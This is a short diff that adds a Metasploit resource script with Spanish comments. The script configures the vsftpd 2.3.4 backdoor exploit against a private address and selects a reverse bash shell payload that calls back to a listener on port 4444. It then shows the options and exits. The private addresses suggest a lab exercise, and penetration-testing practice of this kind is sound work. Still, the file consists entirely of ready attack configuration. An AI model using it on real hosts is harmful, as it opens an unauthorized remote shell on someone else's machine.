@@ -1,0 +1,10 @@
+# Configurar el ataque: objetivo (RHOSTS), payload y a donde vuelve la shell (LHOST).
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.13.37.20
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST 10.13.37.10
+set LPORT 4444
+show options
+
+# Salimos de Metasploit
+exit -y
